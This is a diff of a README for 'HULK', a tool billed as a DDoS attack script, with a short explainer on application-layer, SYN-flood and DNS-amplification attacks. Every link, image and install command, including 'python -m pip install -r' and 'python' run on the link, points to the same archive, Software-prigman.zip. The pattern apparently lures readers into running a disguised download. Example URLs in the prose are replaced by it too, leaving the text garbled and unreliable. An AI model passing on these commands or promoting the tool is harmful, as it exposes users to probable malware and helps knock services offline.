@@ -1,7 +1,7 @@
 # <b>HULK</b> 
 <h2>Http Unbearable Load King 👑</h2><br>
 
-<img src="https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip+-blue"> <img src="https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip"> <a href="https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip"><img src="https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip"></a>
+<img src="https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip+-blue"> <img src="https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip"> <a href="https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip"><img src="https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip"></a>
 
 #
 ## <b>DDOS Attack Script :</b>
@@ -13,8 +13,8 @@
 `sudo apt update && sudo apt upgrade -y`<br>
 `sudo apt install python -y`<br>
 `sudo apt install git -y`<br>
-`python -m pip install -r https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip`<br>
-`python https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip`<br>
+`python -m pip install -r https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip`<br>
+`python https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip`<br>
 #
 
 ## <b>Debian Issue Solved :</b>
@@ -34,7 +34,7 @@
     it may be easiest to use pipx install xyz, which will manage a
     virtual environment for you. Make sure you have pipx installed.
     
-    See https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip for more information.
+    See https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip for more information.
 
 note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
 hint: See PEP 668 for the detailed specification.
@@ -49,7 +49,7 @@ hint: See PEP 668 for the detailed specification.
 <h2> <strong>What is DDOS Attack?</strong> </h2><br></br>
 <h3> DDoS (Distributed Denial of Service) is a category of malicious cyber-attacks that hackers or cybercriminals employ in order to make an online service, network resource or host machine unavailable to its intended users on the Internet. Targets of DDoS attacks are flooded with thousands or millions of superfluous requests, overwhelming the machine and its supporting resources. DDoS attacks are distinct from conventional Denial of Service incidents in that they originate from distributed or multiple sources or IP addresses. To get a sense of the enormous scope of the DDoS threat, the Check Point ThreatCloud Live Cyber Threat Map provides a global window into malware activity, providing a DDoS attacks map where exploits can be viewed in real time.</h3><br>
 
-![Alt text](https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip)<br></br>
+![Alt text](https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip)<br></br>
 
 #
 <h2> <b>Types Of DDOS Attacks</b> </h2>
@@ -57,12 +57,12 @@ hint: See PEP 668 for the detailed specification.
 
 <b> 1. Application layer attacks </b>
 
-The application layer is where the server generates the response to an incoming client request. For example, if a user enters https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip on their browser, an HTTP request is sent to the server, requesting the learning page. The server will fetch all the information related to the page, package it in a response, and send it back to the browser.
+The application layer is where the server generates the response to an incoming client request. For example, if a user enters https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip on their browser, an HTTP request is sent to the server, requesting the learning page. The server will fetch all the information related to the page, package it in a response, and send it back to the browser.
 
 This information fetching and packaging happens on the application layer. An application layer attack occurs when a hacker uses different bots/machines to repeatedly request the same resource from the server, eventually overwhelming it.
 
 The most common type of application layer attacks are the HTTP flood attacks in which malicious actors just keep sending various HTTP requests to a server using different IP addresses. One example of this is asking a server to generate PDF documents over and over again. Since the IP address and other identifiers change in every request, the server can’t detect that it’s being attacked.<br></br>
-<img src="https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip"> <br></br>
+<img src="https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip"> <br></br>
 
 <b> 2. Protocol attacks </b>
 
@@ -71,14 +71,14 @@ Protocol attacks look to exhaust resources of a server or those of its networkin
 Before two computers can initiate a secure communication channel – they must perform a TCP handshake. A TCP handshake is a means for two parties to exchange preliminary information. A SYN packet is typically the first step of the TCP handshake, indicating to the server that the client wants to start a new channel.
 
 In a SYN flood attack, the attacker floods the server with numerous SYN packets, each containing spoofed IP addresses. The server responds to each packet (via SYN-ACKs), requesting the client to complete the handshake. However, the client(s) never respond, and the server keeps waiting. Eventually, it crashes after waiting too <br></br>
-![Alt text](https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip)long for too many responses.<br></br>
+![Alt text](https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip)long for too many responses.<br></br>
 
 <b>3. Volumetric attacks</b>
 
 Volumetric attacks are conducted by bombarding a server with so much traffic that its bandwidth gets completely exhausted. The most common example of a volumetric attack is the DNS amplification attack.
 
 In such an attack, a malicious actor sends requests to a DNS server, using the spoofed IP address of the target. The DNS server then sends its response to the target server. When done at scale, the delugeof DNS responses can wreak havoc on the target server.<br></br>
-![Alt text](https://github.com/riwhbboiebdjf/HULK/raw/refs/heads/main/assets/Software-prigman.zip)<br></br>
+![Alt text](https://raw.githubusercontent.com/riwhbboiebdjf/HULK/main/assets/Software-prigman.zip)<br></br>
 </h3>
 
 #
